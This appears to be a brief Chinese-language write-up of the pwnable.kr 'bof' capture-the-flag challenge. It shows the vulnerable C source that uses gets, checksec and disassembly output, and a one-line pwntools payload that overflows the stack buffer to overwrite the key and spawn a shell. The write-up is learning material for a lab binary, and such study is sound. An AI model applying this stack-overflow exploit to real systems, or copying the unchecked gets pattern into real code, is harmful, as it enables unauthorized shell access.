# bof

這題有點小問題

送nc時 它不會跳出 `overflow me :`

所以不用recvuntil

就直接送

```=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
```=
checksec bof
[*] '/home/user/\xe4\xb8\x8b\xe8\xbc\x89/pwnablekr/bof/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
```=
file bof
bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```
關鍵的地方
```=
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e3d8d0 <gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
```
overflow me 在 ebp-0x2c

key 在 ebp+0x8
```=
r.sendline('a'*(0x2c+0x8)+p32(0xcafebabe))
```
